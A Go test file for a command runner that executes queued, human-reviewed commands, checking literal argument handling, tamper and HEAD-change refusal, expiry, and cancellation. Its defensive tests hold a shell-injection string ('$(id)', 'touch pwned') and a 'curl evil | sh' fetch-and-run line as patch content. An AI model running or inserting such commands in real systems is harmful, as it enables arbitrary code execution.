package runner

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/nicholas1513/handoff/internal/queue"
)

const sid = "0b6c2a8e-1f3d-4c55-9a7e-2d4f6b8c0e12"

func stage(t *testing.T, argv ...string) (*queue.Queue, queue.Reviewed) {
	t.Helper()
	q := &queue.Queue{Root: t.TempDir()}
	body := filepath.Join(t.TempDir(), "body.json")
	os.WriteFile(body, []byte(`{"reviewed":true}`), 0o600)
	it, err := q.Add(queue.Item{Argv: argv, Cwd: t.TempDir(), SessionID: sid}, map[string]string{"body.json": body})
	if err != nil {
		t.Fatal(err)
	}
	r, err := q.Snapshot(it.ID)
	if err != nil {
		t.Fatal(err)
	}
	return q, r
}

func TestNoShellInterpretation(t *testing.T) {
	arg := `a; touch pwned $(id) | cat > x && echo`
	q, r := stage(t, "/bin/echo", arg)
	res, err := Run(context.Background(), q, r, time.Now())
	if err != nil {
		t.Fatal(err)
	}
	if res.State != queue.Succeeded || res.Stdout != arg+"\n" {
		t.Fatalf("got %+v, want literal echo of %q", res, arg)
	}
	if _, err := os.Stat(filepath.Join(r.Item.Cwd, "pwned")); err == nil {
		t.Fatal("shell metacharacters were interpreted")
	}
}

func TestUsesSnapshotPath(t *testing.T) {
	q, r := stage(t, "/bin/cat", "{file:body.json}")
	argv, err := Expand(r)
	if err != nil {
		t.Fatal(err)
	}
	if argv[1] != filepath.Join(r.SnapDir, "body.json") {
		t.Fatalf("expanded to %q, want the snapshot copy", argv[1])
	}
	res, err := Run(context.Background(), q, r, time.Now())
	if err != nil || res.Stdout != `{"reviewed":true}` {
		t.Fatalf("got %+v %v", res, err)
	}
}

func TestExpandRejectsUnknownFile(t *testing.T) {
	_, r := stage(t, "/bin/cat", "@{file:other.json}")
	if _, err := Expand(r); err == nil {
		t.Fatal("unknown attachment accepted")
	}
}

func TestRefusesModified(t *testing.T) {
	q, r := stage(t, "/bin/cat", "{file:body.json}")
	os.WriteFile(filepath.Join(q.Root, "queue", r.Item.ID, "files", "body.json"), []byte("evil"), 0o600)
	_, err := Run(context.Background(), q, r, time.Now())
	if !errors.Is(err, queue.ErrModified) {
		t.Fatalf("err = %v, want ErrModified", err)
	}
	if s := q.State(r.Item, time.Now()); s != queue.Modified {
		t.Fatalf("state = %s, want modified", s)
	}
}

func TestRunsOnce(t *testing.T) {
	q, r := stage(t, "/usr/bin/true")
	if _, err := Run(context.Background(), q, r, time.Now()); err != nil {
		t.Fatal(err)
	}
	if _, err := Run(context.Background(), q, r, time.Now()); err == nil {
		t.Fatal("second run allowed")
	}
}

func TestRefusesExpired(t *testing.T) {
	q, r := stage(t, "/usr/bin/true")
	if _, err := Run(context.Background(), q, r, r.Item.Expires.Add(time.Second)); err == nil {
		t.Fatal("expired item ran")
	}
}

func TestFailureCapturesExitCode(t *testing.T) {
	q, r := stage(t, "/bin/ls", "/definitely/not/here")
	res, err := Run(context.Background(), q, r, time.Now())
	if err != nil {
		t.Fatal(err)
	}
	if res.State != queue.Failed || res.ExitCode == 0 || !strings.Contains(res.Stderr, "not/here") {
		t.Fatalf("got %+v", res)
	}
	if got, _ := q.ReadResult(r.Item); got.SHA256Reviewed != r.Hash {
		t.Fatalf("result hash = %q, want %q", got.SHA256Reviewed, r.Hash)
	}
}

func TestRunsInterpreter(t *testing.T) {
	for argv0, want := range map[string]bool{
		"bash": true, "/bin/sh": true, "zsh": true, "python3": true, "python3.12": true,
		"node": true, "osascript": true, "env": true, "xargs": true, "sudo": true,
		"az": false, "gh": false, "/usr/bin/curl": false, "pythonista": false,
	} {
		if got := RunsInterpreter([]string{argv0, "x"}); got != want {
			t.Errorf("RunsInterpreter(%q) = %v, want %v", argv0, got, want)
		}
	}
}

func TestCancelStopsRunAndWhatItStarted(t *testing.T) {
	// A background child holds stdout open, so only a process-group signal ends this promptly.
	q, r := stage(t, "/bin/sh", "-c", "sleep 30 & sleep 30")
	ctx, cancel := context.WithCancel(context.Background())
	time.AfterFunc(200*time.Millisecond, cancel)
	start := time.Now()
	res, err := Run(ctx, q, r, time.Now())
	if err != nil {
		t.Fatal(err)
	}
	if d := time.Since(start); d > 2*time.Second {
		t.Fatalf("cancel took %v: the process group was not stopped", d)
	}
	if res.State != queue.Canceled || !strings.Contains(res.Stderr, "canceled") {
		t.Fatalf("got %+v, want canceled", res)
	}
	if s := q.State(r.Item, time.Now()); s != queue.Canceled {
		t.Fatalf("recorded state = %s", s)
	}
}

func TestRunRecordsPID(t *testing.T) {
	q, r := stage(t, "/bin/sleep", "30")
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() { Run(ctx, q, r, time.Now()); close(done) }()
	pid := 0
	for i := 0; i < 100 && pid == 0; i++ {
		time.Sleep(20 * time.Millisecond)
		pid, _ = q.ClaimPID(r.Item)
	}
	cancel()
	<-done
	if pid == 0 {
		t.Fatal("running item has no recorded pid")
	}
}

// sleeper starts a stand-in for a run left behind by a viewer that went away.
func sleeper(t *testing.T) *exec.Cmd {
	t.Helper()
	cmd := exec.Command("/bin/sleep", "30")
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { cmd.Process.Kill() })
	return cmd
}

func claimed(t *testing.T, argv ...string) (*queue.Queue, queue.Reviewed) {
	t.Helper()
	q, r := stage(t, argv...)
	if err := q.Claim(r.Item); err != nil {
		t.Fatal(err)
	}
	return q, r
}

func TestCancelStaleStopsRecordedProcess(t *testing.T) {
	q, r := claimed(t, "/bin/sleep", "30")
	p := sleeper(t)
	q.RecordPID(r.Item, p.Process.Pid)
	if err := CancelStale(q, r.Item, time.Now()); err != nil {
		t.Fatal(err)
	}
	exited := make(chan struct{})
	go func() { p.Wait(); close(exited) }()
	select {
	case <-exited:
	case <-time.After(2 * time.Second):
		t.Fatal("the recorded process is still running")
	}
	if res, _ := q.ReadResult(r.Item); res.State != queue.Canceled || !strings.Contains(res.Stderr, "stopped process") {
		t.Fatalf("result = %+v", res)
	}
}

func TestCancelStaleLeavesReusedPIDAlone(t *testing.T) {
	q, r := claimed(t, "/usr/bin/true") // the recorded pid now belongs to a different program
	p := sleeper(t)
	q.RecordPID(r.Item, p.Process.Pid)
	if err := CancelStale(q, r.Item, time.Now()); err != nil {
		t.Fatal(err)
	}
	if err := syscall.Kill(p.Process.Pid, 0); err != nil {
		t.Fatal("an unrelated process was signalled")
	}
	if res, _ := q.ReadResult(r.Item); res.State != queue.Canceled || !strings.Contains(res.Stderr, "nothing was stopped") {
		t.Fatalf("result = %+v", res)
	}
}

func TestCancelStaleWithoutPID(t *testing.T) {
	q, r := claimed(t, "/bin/sleep", "30")
	if err := CancelStale(q, r.Item, time.Now()); err != nil {
		t.Fatal(err)
	}
	if res, _ := q.ReadResult(r.Item); res.State != queue.Canceled || !strings.Contains(res.Stderr, "no process was recorded") {
		t.Fatalf("result = %+v", res)
	}
}

func TestEditRunsOnlyAgainstReviewedTarget(t *testing.T) {
	stageEdit := func(target string) (*queue.Queue, queue.Reviewed) {
		q := &queue.Queue{Root: t.TempDir()}
		proposed := filepath.Join(t.TempDir(), "new")
		os.WriteFile(proposed, []byte("new\n"), 0o600)
		it, err := q.Add(queue.Item{Edit: target, Argv: queue.EditArgv(target), Cwd: t.TempDir(), SessionID: sid},
			map[string]string{queue.EditFile: proposed})
		if err != nil {
			t.Fatal(err)
		}
		r, err := q.Snapshot(it.ID)
		if err != nil {
			t.Fatal(err)
		}
		return q, r
	}
	target := filepath.Join(t.TempDir(), "f")
	os.WriteFile(target, []byte("old\n"), 0o600)

	q, r := stageEdit(target)
	if res, err := Run(context.Background(), q, r, time.Now()); err != nil || res.State != queue.Succeeded {
		t.Fatalf("run = %+v, %v", res, err)
	}
	if b, _ := os.ReadFile(target); string(b) != "new\n" {
		t.Fatalf("target = %q", b)
	}

	os.WriteFile(target, []byte("old\n"), 0o600)
	q, r = stageEdit(target)
	os.WriteFile(target, []byte("someone else's edit\n"), 0o600)
	if res, _ := Run(context.Background(), q, r, time.Now()); res.State != queue.Modified {
		t.Fatalf("target changed after review, state = %s", res.State)
	}
	if b, _ := os.ReadFile(target); string(b) != "someone else's edit\n" {
		t.Fatalf("overwrote a target that changed after review: %q", b)
	}
}

func TestCancelStaleOnlyForRunning(t *testing.T) {
	q, r := stage(t, "/usr/bin/true")
	if err := CancelStale(q, r.Item, time.Now()); err == nil {
		t.Fatal("canceled a pending item")
	}
	if s := q.State(r.Item, time.Now()); s != queue.Pending {
		t.Fatalf("state = %s", s)
	}
}

// gitT runs git for a test, with the user's config, hooks and signing kept out (the runner's git inherits the env too),
// and returns its output.
func gitT(t *testing.T, args ...string) string {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	for k, v := range map[string]string{"GIT_CONFIG_GLOBAL": os.DevNull, "GIT_CONFIG_NOSYSTEM": "1",
		"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@x", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@x"} {
		t.Setenv(k, v)
	}
	cmd := exec.Command("git", args...)
	var stderr strings.Builder
	cmd.Stderr = &stderr
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("git %q: %v\n%s", args, err, stderr.String())
	}
	return string(out)
}

// TestAmRefusedWhenHeadMoved: an am item runs only on the HEAD it was reviewed on, which the review copy showed it
// applied to. Reviewing it again on the new HEAD lets it run.
func TestAmRefusedWhenHeadMoved(t *testing.T) {
	src, repo := filepath.Join(t.TempDir(), "src"), filepath.Join(t.TempDir(), "repo")
	gitT(t, "init", "-q", src)
	os.WriteFile(filepath.Join(src, "f"), []byte("a\n"), 0o600)
	gitT(t, "-C", src, "add", ".")
	gitT(t, "-C", src, "commit", "-qm", "base")
	gitT(t, "clone", "-q", src, repo)
	os.WriteFile(filepath.Join(src, "f"), []byte("b\n"), 0o600)
	gitT(t, "-C", src, "commit", "-qam", "Change f")
	patch := filepath.Join(t.TempDir(), "c.patch")
	os.WriteFile(patch, []byte(gitT(t, "-C", src, "format-patch", "--stdout", "HEAD~1")), 0o600)

	q := &queue.Queue{Root: t.TempDir()}
	it, err := q.Add(queue.Item{Argv: []string{"git", "-C", repo, "am", "{file:c.patch}"}, Cwd: t.TempDir(), SessionID: sid},
		map[string]string{"c.patch": patch})
	if err != nil {
		t.Fatal(err)
	}
	r, err := q.Snapshot(it.ID)
	if head := strings.TrimSpace(gitT(t, "-C", repo, "rev-parse", "HEAD")); err != nil || r.AmBase != head {
		t.Fatalf("AmBase = %q, %v; want HEAD %s", r.AmBase, err, head)
	}
	os.WriteFile(filepath.Join(repo, "g"), []byte("x\n"), 0o600)
	gitT(t, "-C", repo, "add", "g")
	gitT(t, "-C", repo, "commit", "-qm", "Move on")
	if err := q.Verify(r); !errors.Is(err, queue.ErrModified) || !strings.Contains(err.Error(), repo+" HEAD moved since review") {
		t.Fatalf("Verify after HEAD moved = %v", err)
	}
	if r, err = q.Snapshot(it.ID); err != nil {
		t.Fatal(err)
	}
	if res, err := Run(context.Background(), q, r, time.Now()); err != nil || res.State != queue.Succeeded {
		t.Fatalf("run after reviewing again = %+v, %v", res, err)
	}
	if got := gitT(t, "-C", repo, "log", "--format=%s", "-3"); got != "Change f\nMove on\nbase\n" {
		t.Fatalf("log = %q", got)
	}
}

// amPatch is a format-patch of one commit changing f from "a\n", and clones at each of paths of the repository it
// applies to.
func amPatch(t *testing.T, paths ...string) string {
	src := filepath.Join(t.TempDir(), "src")
	gitT(t, "init", "-q", src)
	os.WriteFile(filepath.Join(src, "f"), []byte("a\n"), 0o600)
	gitT(t, "-C", src, "add", ".")
	gitT(t, "-C", src, "commit", "-qm", "base")
	for _, p := range paths {
		gitT(t, "clone", "-q", src, p)
	}
	os.WriteFile(filepath.Join(src, "f"), []byte("b\n"), 0o600)
	gitT(t, "-C", src, "commit", "-qam", "Change f")
	patch := filepath.Join(t.TempDir(), "c.patch")
	os.WriteFile(patch, []byte(gitT(t, "-C", src, "format-patch", "--stdout", "HEAD~1")), 0o600)
	return patch
}

// TestAmRefusedInAnotherRepository: a repository put at the item's -C path after review (a symlink repointed, or a
// directory renamed into its place) is refused even at the same HEAD: its config, hooks and objects were not reviewed.
func TestAmRefusedInAnotherRepository(t *testing.T) {
	for _, swap := range []string{"symlink", "rename"} {
		t.Run(swap, func(t *testing.T) {
			cwd := t.TempDir()
			a, b, at := filepath.Join(cwd, "a"), filepath.Join(cwd, "b"), filepath.Join(cwd, "repo")
			patch := amPatch(t, a, b)
			move := func(from string) {
				if swap == "symlink" {
					os.Remove(at)
					os.Symlink(from, at)
				} else {
					os.Rename(at, filepath.Join(cwd, "old"))
					os.Rename(from, at)
				}
			}
			move(a)
			q := &queue.Queue{Root: t.TempDir()}
			argv := []string{"git", "-C", "repo", "am", "{file:c.patch}"}
			it, err := q.Add(queue.Item{Argv: argv, Cwd: cwd, SessionID: sid}, map[string]string{"c.patch": patch})
			if err != nil {
				t.Fatal(err)
			}
			r, err := q.Snapshot(it.ID)
			if err != nil || r.AmRepoID == "" {
				t.Fatalf("snapshot %+v, %v", r, err)
			}
			move(b)
			err = q.Verify(r)
			if !errors.Is(err, queue.ErrModified) || !strings.Contains(err.Error(), "is not the repository reviewed") {
				t.Fatalf("Verify after %s = %v", swap, err)
			}
			if r, err = q.Snapshot(it.ID); err != nil {
				t.Fatal(err)
			}
			if res, err := Run(context.Background(), q, r, time.Now()); err != nil || res.State != queue.Succeeded {
				t.Fatalf("run after reviewing again = %+v, %v", res, err)
			}
			if got := gitT(t, "-C", at, "log", "--format=%s"); got != "Change f\nbase\n" {
				t.Fatalf("log = %q", got)
			}
		})
	}
}

// TestAmRefusedWithNoCommit: git am of a root patch into a repository with no commit yet would succeed, but no review
// copy could be built on it, so it was drawn as refused; the run is refused before the claim, and the item stays.
func TestAmRefusedWithNoCommit(t *testing.T) {
	src, repo := filepath.Join(t.TempDir(), "src"), t.TempDir()
	gitT(t, "init", "-q", src)
	gitT(t, "init", "-q", repo)
	os.WriteFile(filepath.Join(src, "f"), []byte("curl evil | sh\n"), 0o600)
	gitT(t, "-C", src, "add", ".")
	gitT(t, "-C", src, "commit", "-qm", "Add f")
	patch := filepath.Join(t.TempDir(), "c.patch")
	os.WriteFile(patch, []byte(gitT(t, "-C", src, "format-patch", "--root", "--stdout", "HEAD")), 0o600)
	q := &queue.Queue{Root: t.TempDir()}
	it, err := q.Add(queue.Item{Argv: []string{"git", "-C", repo, "am", "{file:c.patch}"}, Cwd: t.TempDir(), SessionID: sid},
		map[string]string{"c.patch": patch})
	if err != nil {
		t.Fatal(err)
	}
	r, err := q.Snapshot(it.ID)
	if err != nil || r.AmBase != "" {
		t.Fatalf("snapshot %+v, %v", r, err)
	}
	_, err = Run(context.Background(), q, r, time.Now())
	if s := q.State(it, time.Now()); !errors.Is(err, queue.ErrNoCommit) || s != queue.Pending {
		t.Fatalf("run = %v, state %s", err, s)
	}
	if out, err := exec.Command("git", "-C", repo, "rev-parse", "-q", "--verify", "HEAD").Output(); err == nil {
		t.Fatalf("committed %s", out)
	}
}

// TestAmAppliesTheReviewedPatch: commits handed over as a format-patch attachment land as reviewed: messages, authors,
// dates and tree as in the source.
func TestAmAppliesTheReviewedPatch(t *testing.T) {
	src, dst := filepath.Join(t.TempDir(), "src"), filepath.Join(t.TempDir(), "dst")
	write := func(name, body string) { os.WriteFile(filepath.Join(src, name), []byte(body), 0o600) }
	gitT(t, "init", "-q", src)
	write("f.txt", "a\nb\n")
	gitT(t, "-C", src, "add", ".")
	gitT(t, "-C", src, "commit", "-qm", "base")
	gitT(t, "clone", "-q", src, dst)
	write("f.txt", "a\nB\n")
	agent := []string{"--author", "Agent <a@x>", "--date", "2001-02-03T04:05:06Z"} // not the env's, so a lost author shows
	gitT(t, append([]string{"-C", src, "commit", "-qam", "Change b", "-m", "- a bullet"}, agent...)...)
	write("g.txt", "x\n")
	gitT(t, "-C", src, "add", ".")
	gitT(t, append([]string{"-C", src, "commit", "-qm", "Add g"}, agent...)...)
	patch := filepath.Join(t.TempDir(), "commits.patch")
	os.WriteFile(patch, []byte(gitT(t, "-C", src, "format-patch", "--stdout", "HEAD~2..HEAD")), 0o600)

	q := &queue.Queue{Root: t.TempDir()}
	it, err := q.Add(queue.Item{Argv: []string{"git", "-C", dst, "am", "{file:commits.patch}"}, Cwd: t.TempDir(), SessionID: sid},
		map[string]string{"commits.patch": patch})
	if err != nil {
		t.Fatal(err)
	}
	r, err := q.Snapshot(it.ID)
	if err != nil {
		t.Fatal(err)
	}
	if res, err := Run(context.Background(), q, r, time.Now()); err != nil || res.State != queue.Succeeded {
		t.Fatalf("got %+v %v", res, err)
	}
	for _, args := range [][]string{{"log", "--format=%an <%ae> %ad%n%B", "-3"}, {"rev-parse", "HEAD^{tree}"}} {
		if got, want := gitT(t, append([]string{"-C", dst}, args...)...), gitT(t, append([]string{"-C", src}, args...)...); got != want {
			t.Errorf("git %s in the repo = %q, want %q as in the source", args, got, want)
		}
	}
}
